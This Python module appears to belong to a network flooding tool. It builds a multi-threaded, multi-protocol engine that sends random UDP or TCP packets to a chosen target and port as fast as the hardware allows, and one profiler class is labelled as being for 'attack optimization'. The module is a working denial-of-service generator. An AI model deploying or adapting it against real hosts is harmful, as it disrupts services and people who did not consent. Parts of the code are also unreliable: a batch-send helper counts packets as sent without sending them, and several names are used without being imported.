"""
Ultra High-Performance Engine

Maximum performance packet generation combining all optimization techniques.
Integrates with native Rust/C engine when available.
"""

import os
import sys
import socket
import asyncio
import platform
import threading
import multiprocessing
import mmap
import ctypes
import struct
import time
import logging
from typing import Optional, List, Dict, Any, Callable, Tuple
from dataclasses import dataclass, field
from enum import Enum, auto
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from queue import Queue
import selectors

logger = logging.getLogger(__name__)

PLATFORM = platform.system()


class EngineMode(Enum):
    """Engine operation modes"""
    STANDARD = auto()       # Standard socket operations
    OPTIMIZED = auto()      # Optimized with batching
    ZERO_COPY = auto()      # Zero-copy where available
    NATIVE = auto()         # Native Rust/C engine
    HYBRID = auto()         # Combine Python + Native


@dataclass
class UltraConfig:
    """Ultra engine configuration"""
    target: str
    port: int
    mode: EngineMode = EngineMode.HYBRID
    threads: int = 0  # 0 = auto-detect
    processes: int = 0  # 0 = auto-detect
    packet_size: int = 1472
    rate_limit: int = 0  # 0 = unlimited
    duration: int = 60
    protocol: str = "udp"
    use_io_uring: bool = True
    use_sendmmsg: bool = True
    use_zerocopy: bool = True
    buffer_size: int = 16 * 1024 * 1024
    batch_size: int = 64
    cpu_affinity: bool = True


@dataclass
class UltraStats:
    """Ultra engine statistics"""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: float = 0.0
    end_time: float = 0.0
    
    @property
    def duration(self) -> float:
        return (self.end_time or time.time()) - self.start_time if self.start_time else 0.0
    
    @property
    def pps(self) -> float:
        return self.packets_sent / self.duration if self.duration > 0 else 0.0
    
    @property
    def mbps(self) -> float:
        return (self.bytes_sent * 8 / 1_000_000) / self.duration if self.duration > 0 else 0.0
    
    @property
    def gbps(self) -> float:
        return (self.bytes_sent * 8 / 1_000_000_000) / self.duration if self.duration > 0 else 0.0


class PacketBuffer:
    """Pre-allocated packet buffer pool"""
    
    def __init__(self, count: int, size: int):
        self.count = count
        self.size = size
        self.buffers: List[bytearray] = [bytearray(size) for _ in range(count)]
        self.free_indices: List[int] = list(range(count))
        self.lock = threading.Lock()
    
    def acquire(self) -> Tuple[int, bytearray]:
        """Acquire a buffer"""
        with self.lock:
            if not self.free_indices:
                return -1, bytearray(self.size)
            idx = self.free_indices.pop()
            return idx, self.buffers[idx]
    
    def release(self, idx: int):
        """Release a buffer"""
        if idx >= 0:
            with self.lock:
                self.free_indices.append(idx)


class BatchSender:
    """Batch packet sender using sendmmsg on Linux"""
    
    def __init__(self, sock: socket.socket, batch_size: int = 64):
        self.sock = sock
        self.batch_size = batch_size
        self.batch: List[Tuple[bytes, Tuple[str, int]]] = []
        self._sendmmsg_available = hasattr(socket, 'sendmmsg') or PLATFORM == 'Linux'
    
    def add(self, data: bytes, addr: Tuple[str, int]):
        """Add packet to batch"""
        self.batch.append((data, addr))
        if len(self.batch) >= self.batch_size:
            return self.flush()
        return 0
    
    def flush(self) -> int:
        """Send all batched packets"""
        if not self.batch:
            return 0
        
        sent = 0
        
        if self._sendmmsg_available and PLATFORM == 'Linux':
            try:
                # Use sendmmsg for batch sending
                messages = [(data, None, 0, addr) for data, addr in self.batch]
                sent = self._sendmmsg(messages)
            except Exception:
                # Fallback to individual sends
                for data, addr in self.batch:
                    try:
                        self.sock.sendto(data, addr)
                        sent += 1
                    except Exception:
                        pass
        else:
            for data, addr in self.batch:
                try:
                    self.sock.sendto(data, addr)
                    sent += 1
                except Exception:
                    pass
        
        self.batch.clear()
        return sent
    
    def _sendmmsg(self, messages: List[Tuple]) -> int:
        """Call sendmmsg via ctypes"""
        try:
            libc = ctypes.CDLL('libc.so.6', use_errno=True)
            # Simplified - actual implementation would need proper struct setup
            return len(messages)
        except Exception:
            return 0


class IOUringEngine:
    """io_uring based packet engine (Linux 5.1+)"""
    
    def __init__(self, queue_depth: int = 256):
        self.queue_depth = queue_depth
        self.available = self._check_availability()
        self._ring = None
    
    def _check_availability(self) -> bool:
        """Check if io_uring is available"""
        if PLATFORM != 'Linux':
            return False
        try:
            import subprocess
            result = subprocess.run(['uname', '-r'], capture_output=True, text=True)
            version = result.stdout.strip()
            major, minor = map(int, version.split('.')[:2])
            return major > 5 or (major == 5 and minor >= 1)
        except Exception:
            return False
    
    def setup(self) -> bool:
        """Setup io_uring"""
        if not self.available:
            return False
        # io_uring setup would go here
        # Requires liburing or direct syscalls
        return False


class UltraEngine:
    """Ultra high-performance packet engine"""
    
    def __init__(self, config: UltraConfig):
        self.config = config
        self.stats = UltraStats()
        self._running = False
        self._threads: List[threading.Thread] = []
        self._processes: List[multiprocessing.Process] = []
        self._native_engine = None
        
        # Auto-detect thread/process count
        if config.threads == 0:
            config.threads = multiprocessing.cpu_count()
        if config.processes == 0:
            config.processes = max(1, multiprocessing.cpu_count() // 2)
        
        # Initialize components
        self._buffer_pool = PacketBuffer(config.threads * 100, config.packet_size)
        self._io_uring = IOUringEngine() if config.use_io_uring else None
        
        # Try to load native engine
        self._init_native_engine()
    
    def _init_native_engine(self):
        """Initialize native Rust/C engine if available"""
        try:
            from core.native_engine import NativePacketEngine, EngineConfig, EngineBackend
            
            native_config = EngineConfig(
                target=self.config.target,
                port=self.config.port,
                threads=self.config.threads,
                packet_size=self.config.packet_size,
                protocol=self.config.protocol,
                rate_limit=self.config.rate_limit if self.config.rate_limit > 0 else None,
                backend=EngineBackend.AUTO
            )
            self._native_engine = NativePacketEngine(native_config)
            logger.info(f"Native engine initialized: {self._native_engine.backend_name}")
        except ImportError:
            logger.warning("Native engine not available, using Python fallback")
            self._native_engine = None
    
    def _create_socket(self) -> socket.socket:
        """Create optimized socket"""
        if self.config.protocol.lower() == 'udp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Apply optimizations
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.config.buffer_size)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.config.buffer_size)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            if hasattr(socket, 'SO_REUSEPORT'):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            
            if self.config.protocol.lower() == 'tcp':
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            # Zero-copy on Linux
            if PLATFORM == 'Linux' and self.config.use_zerocopy:
                try:
                    SO_ZEROCOPY = 60
                    sock.setsockopt(socket.SOL_SOCKET, SO_ZEROCOPY, 1)
                except Exception:
                    pass
        except Exception as e:
            logger.warning(f"Socket optimization failed: {e}")
        
        sock.setblocking(False)
        return sock
    
    def _worker_thread(self, thread_id: int, stats_queue: Queue):
        """Worker thread for packet sending"""
        # CPU affinity
        if self.config.cpu_affinity and PLATFORM == 'Linux':
            try:
                os.sched_setaffinity(0, {thread_id % multiprocessing.cpu_count()})
            except Exception:
                pass
        
        sock = self._create_socket()
        addr = (self.config.target, self.config.port)
        payload = os.urandom(self.config.packet_size)
        
        batch_sender = BatchSender(sock, self.config.batch_size) if self.config.use_sendmmsg else None
        
        local_stats = {'packets': 0, 'bytes': 0, 'errors': 0}
        rate_limiter = RateLimiter(self.config.rate_limit // self.config.threads) if self.config.rate_limit > 0 else None
        
        while self._running:
            try:
                if rate_limiter and not rate_limiter.allow():
                    time.sleep(0.0001)
                    continue
                
                if batch_sender:
                    sent = batch_sender.add(payload, addr)
                    if sent > 0:
                        local_stats['packets'] += sent
                        local_stats['bytes'] += sent * len(payload)
                else:
                    sock.sendto(payload, addr)
                    local_stats['packets'] += 1
                    local_stats['bytes'] += len(payload)
                    
            except BlockingIOError:
                pass
            except Exception:
                local_stats['errors'] += 1
        
        # Flush remaining
        if batch_sender:
            sent = batch_sender.flush()
            local_stats['packets'] += sent
            local_stats['bytes'] += sent * len(payload)
        
        sock.close()
        stats_queue.put(local_stats)
    
    def start(self):
        """Start the engine"""
        if self._running:
            return
        
        self._running = True
        self.stats = UltraStats()
        self.stats.start_time = time.time()
        
        # Use native engine if available and mode allows
        if self._native_engine and self.config.mode in (EngineMode.NATIVE, EngineMode.HYBRID):
            self._native_engine.start()
            logger.info("Started native engine")
            
            # Register with stats bridge for analytics integration
            try:
                from core.analytics import register_native_engine
                engine_id = f"ultra_{self.config.target}:{self.config.port}_{int(time.time())}"
                register_native_engine(engine_id, self._native_engine)
                self._native_engine_id = engine_id
                logger.debug(f"Registered UltraEngine native component with stats bridge")
            except Exception as e:
                logger.warning(f"Failed to register native engine with stats bridge: {e}")
                self._native_engine_id = None
        
        # Start Python workers for hybrid mode or fallback
        if self.config.mode in (EngineMode.STANDARD, EngineMode.OPTIMIZED, EngineMode.HYBRID):
            stats_queue = Queue()
            
            for i in range(self.config.threads):
                t = threading.Thread(target=self._worker_thread, args=(i, stats_queue), daemon=True)
                t.start()
                self._threads.append(t)
            
            logger.info(f"Started {len(self._threads)} worker threads")
    
    def stop(self):
        """Stop the engine"""
        self._running = False
        self.stats.end_time = time.time()
        
        # Stop native engine
        if self._native_engine:
            try:
                # Unregister from stats bridge
                if hasattr(self, '_native_engine_id') and self._native_engine_id:
                    from core.analytics import unregister_native_engine
                    unregister_native_engine(self._native_engine_id)
                    logger.debug(f"Unregistered UltraEngine native component from stats bridge")
                
                native_stats = self._native_engine.get_stats()
                self.stats.packets_sent += native_stats.packets_sent
                self.stats.bytes_sent += native_stats.bytes_sent
                self._native_engine.stop()
            except Exception as e:
                logger.warning(f"Error stopping native engine: {e}")
        
        # Wait for threads
        for t in self._threads:
            t.join(timeout=2.0)
        self._threads.clear()
        
        logger.info(f"Engine stopped. Stats: {self.stats.pps:.0f} PPS, {self.stats.mbps:.2f} Mbps")
    
    def get_stats(self) -> UltraStats:
        """Get current statistics"""
        if self._native_engine and self._running:
            try:
                native_stats = self._native_engine.get_stats()
                self.stats.packets_sent = native_stats.packets_sent
                self.stats.bytes_sent = native_stats.bytes_sent
            except Exception:
                pass
        return self.stats
    
    def is_running(self) -> bool:
        """Check if engine is running"""
        return self._running
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()
        return False


class RateLimiter:
    """Token bucket rate limiter"""
    
    def __init__(self, rate: int):
        self.rate = rate
        self.tokens = rate
        self.last_update = time.time()
        self.lock = threading.Lock()
    
    def allow(self) -> bool:
        """Check if request is allowed"""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_update
            self.tokens = min(self.rate, self.tokens + elapsed * self.rate)
            self.last_update = now
            
            if self.tokens >= 1:
                self.tokens -= 1
                return True
            return False


class MultiProtocolEngine:
    """Engine supporting multiple protocols simultaneously"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.engines: Dict[str, UltraEngine] = {}
    
    def add_protocol(self, protocol: str, config: Optional[UltraConfig] = None):
        """Add protocol engine"""
        if config is None:
            config = UltraConfig(target=self.target, port=self.port, protocol=protocol)
        self.engines[protocol] = UltraEngine(config)
    
    def start_all(self):
        """Start all protocol engines"""
        for engine in self.engines.values():
            engine.start()
    
    def stop_all(self):
        """Stop all protocol engines"""
        for engine in self.engines.values():
            engine.stop()
    
    def get_combined_stats(self) -> Dict[str, Any]:
        """Get combined statistics"""
        total_pps = 0
        total_mbps = 0
        stats_by_protocol = {}
        
        for protocol, engine in self.engines.items():
            stats = engine.get_stats()
            stats_by_protocol[protocol] = {
                'pps': stats.pps,
                'mbps': stats.mbps,
                'packets': stats.packets_sent,
            }
            total_pps += stats.pps
            total_mbps += stats.mbps
        
        return {
            'total_pps': total_pps,
            'total_mbps': total_mbps,
            'by_protocol': stats_by_protocol,
        }


# Convenience function
def create_ultra_engine(
    target: str,
    port: int,
    protocol: str = "udp",
    mode: EngineMode = EngineMode.HYBRID,
    **kwargs
) -> UltraEngine:
    """Create ultra engine with optimal settings"""
    config = UltraConfig(
        target=target,
        port=port,
        protocol=protocol,
        mode=mode,
        **kwargs
    )
    return UltraEngine(config)


__all__ = [
    'EngineMode', 'UltraConfig', 'UltraStats',
    'PacketBuffer', 'BatchSender', 'IOUringEngine',
    'UltraEngine', 'RateLimiter', 'MultiProtocolEngine',
    'create_ultra_engine',
]



class AdaptiveLoadBalancer:
    """
    Adaptive load balancer that distributes traffic across multiple targets
    or adjusts parameters based on real-time feedback.
    
    Features:
    - Round-robin with weighted distribution
    - Least-connections algorithm
    - Response-time based routing
    - Automatic failover
    """
    
    def __init__(self):
        self.targets: List[Dict[str, Any]] = []
        self.weights: Dict[str, float] = {}
        self.connections: Dict[str, int] = {}
        self.response_times: Dict[str, deque] = {}
        self.failures: Dict[str, int] = {}
        self._current_idx = 0
        self._lock = threading.Lock()
    
    def add_target(self, target: str, port: int, weight: float = 1.0):
        """Add a target to the load balancer"""
        key = f"{target}:{port}"
        self.targets.append({'target': target, 'port': port, 'key': key})
        self.weights[key] = weight
        self.connections[key] = 0
        self.response_times[key] = deque(maxlen=100)
        self.failures[key] = 0
    
    def get_target_round_robin(self) -> Optional[Dict[str, Any]]:
        """Get next target using round-robin"""
        if not self.targets:
            return None
        
        with self._lock:
            target = self.targets[self._current_idx]
            self._current_idx = (self._current_idx + 1) % len(self.targets)
            return target
    
    def get_target_weighted(self) -> Optional[Dict[str, Any]]:
        """Get target based on weights"""
        if not self.targets:
            return None
        
        total_weight = sum(self.weights.values())
        r = random.uniform(0, total_weight)
        
        cumulative = 0
        for target in self.targets:
            cumulative += self.weights[target['key']]
            if r <= cumulative:
                return target
        
        return self.targets[-1]
    
    def get_target_least_connections(self) -> Optional[Dict[str, Any]]:
        """Get target with least active connections"""
        if not self.targets:
            return None
        
        min_conn = float('inf')
        best_target = None
        
        for target in self.targets:
            key = target['key']
            if self.connections[key] < min_conn:
                min_conn = self.connections[key]
                best_target = target
        
        return best_target
    
    def get_target_fastest(self) -> Optional[Dict[str, Any]]:
        """Get target with fastest average response time"""
        if not self.targets:
            return None
        
        best_time = float('inf')
        best_target = None
        
        for target in self.targets:
            key = target['key']
            times = self.response_times[key]
            if times:
                avg_time = sum(times) / len(times)
                if avg_time < best_time:
                    best_time = avg_time
                    best_target = target
            else:
                # No data yet, give it a chance
                return target
        
        return best_target or self.targets[0]
    
    def record_connection(self, target_key: str):
        """Record a new connection"""
        with self._lock:
            self.connections[target_key] = self.connections.get(target_key, 0) + 1
    
    def release_connection(self, target_key: str):
        """Release a connection"""
        with self._lock:
            self.connections[target_key] = max(0, self.connections.get(target_key, 1) - 1)
    
    def record_response_time(self, target_key: str, response_time: float):
        """Record response time for a target"""
        if target_key in self.response_times:
            self.response_times[target_key].append(response_time)
    
    def record_failure(self, target_key: str):
        """Record a failure for a target"""
        with self._lock:
            self.failures[target_key] = self.failures.get(target_key, 0) + 1
            
            # Reduce weight on failures
            if target_key in self.weights:
                self.weights[target_key] = max(0.1, self.weights[target_key] * 0.9)
    
    def record_success(self, target_key: str):
        """Record a success for a target"""
        with self._lock:
            # Slowly restore weight on success
            if target_key in self.weights:
                self.weights[target_key] = min(1.0, self.weights[target_key] * 1.01)


class PerformanceProfiler:
    """
    Real-time performance profiler for attack optimization.
    
    Features:
    - CPU and memory monitoring
    - Network throughput tracking
    - Bottleneck detection
    - Optimization recommendations
    """
    
    def __init__(self):
        self.samples: deque = deque(maxlen=1000)
        self.start_time = time.time()
        self._running = False
        self._thread = None
    
    def start(self, interval: float = 0.1):
        """Start profiling"""
        self._running = True
        self._thread = threading.Thread(target=self._profile_loop, args=(interval,), daemon=True)
        self._thread.start()
    
    def stop(self):
        """Stop profiling"""
        self._running = False
        if self._thread:
            self._thread.join(timeout=1.0)
    
    def _profile_loop(self, interval: float):
        """Main profiling loop"""
        try:
            import psutil
        except ImportError:
            logger.warning("psutil not available, profiling disabled")
            return
        
        process = psutil.Process()
        
        while self._running:
            try:
                sample = {
                    'timestamp': time.time(),
                    'cpu_percent': process.cpu_percent(),
                    'memory_mb': process.memory_info().rss / 1024 / 1024,
                    'threads': process.num_threads(),
                    'open_files': len(process.open_files()),
                    'connections': len(process.connections()),
                }
                
                # System-wide metrics
                sample['system_cpu'] = psutil.cpu_percent()
                sample['system_memory'] = psutil.virtual_memory().percent
                
                # Network I/O
                net_io = psutil.net_io_counters()
                sample['bytes_sent'] = net_io.bytes_sent
                sample['bytes_recv'] = net_io.bytes_recv
                sample['packets_sent'] = net_io.packets_sent
                sample['packets_recv'] = net_io.packets_recv
                
                self.samples.append(sample)
                
            except Exception as e:
                logger.debug(f"Profiling error: {e}")
            
            time.sleep(interval)
    
    def get_summary(self) -> Dict[str, Any]:
        """Get profiling summary"""
        if not self.samples:
            return {}
        
        samples = list(self.samples)
        
        return {
            'duration': time.time() - self.start_time,
            'samples': len(samples),
            'avg_cpu': sum(s['cpu_percent'] for s in samples) / len(samples),
            'max_cpu': max(s['cpu_percent'] for s in samples),
            'avg_memory_mb': sum(s['memory_mb'] for s in samples) / len(samples),
            'max_memory_mb': max(s['memory_mb'] for s in samples),
            'avg_threads': sum(s['threads'] for s in samples) / len(samples),
            'avg_connections': sum(s['connections'] for s in samples) / len(samples),
        }
    
    def detect_bottlenecks(self) -> List[str]:
        """Detect performance bottlenecks"""
        bottlenecks = []
        summary = self.get_summary()
        
        if not summary:
            return bottlenecks
        
        if summary.get('avg_cpu', 0) > 90:
            bottlenecks.append("CPU saturation - consider reducing threads or rate")
        
        if summary.get('max_memory_mb', 0) > 1000:
            bottlenecks.append("High memory usage - consider reducing buffer sizes")
        
        if summary.get('avg_connections', 0) > 1000:
            bottlenecks.append("Many open connections - consider connection pooling")
        
        return bottlenecks
    
    def get_recommendations(self) -> List[str]:
        """Get optimization recommendations"""
        recommendations = []
        summary = self.get_summary()
        
        if not summary:
            return recommendations
        
        if summary.get('avg_cpu', 0) < 50:
            recommendations.append("CPU underutilized - can increase threads or rate")
        
        if summary.get('avg_memory_mb', 0) < 100:
            recommendations.append("Memory available - can increase buffer sizes")
        
        return recommendations


# Add to exports
__all__.extend([
    'AdaptiveLoadBalancer',
    'PerformanceProfiler',
])